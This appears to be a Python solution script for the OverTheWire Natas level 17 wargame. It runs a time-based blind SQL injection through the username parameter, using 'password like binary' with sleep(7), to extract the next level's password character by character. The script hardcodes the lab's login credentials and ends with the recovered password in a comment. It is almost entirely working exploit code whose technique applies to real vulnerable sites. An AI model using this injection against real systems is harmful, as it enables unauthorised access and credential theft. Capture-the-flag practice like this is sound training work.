import time

import requests
from string import digits, ascii_lowercase, ascii_uppercase


url = "http://natas17.natas.labs.overthewire.org/index.php"

chars = ascii_lowercase + ascii_uppercase + digits
password = ""
user_exists = "This user exists"

pw_len = len("AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

for i in range(pw_len):
    for curr_char in chars:
        curr_pw = password + curr_char
        print("trying password: " + curr_pw)
        params = (('username', 'natas18" and password like binary "' + curr_pw + '%" and sleep(7)-- '), ("debug", "true"))

        s = requests.Session()
        s.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
        before = time.time()
        r = s.get(url, params=params)
        after = time.time()
        if after - before > 7:
            password = curr_pw
            print("current password: " + curr_pw)
            break

# xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP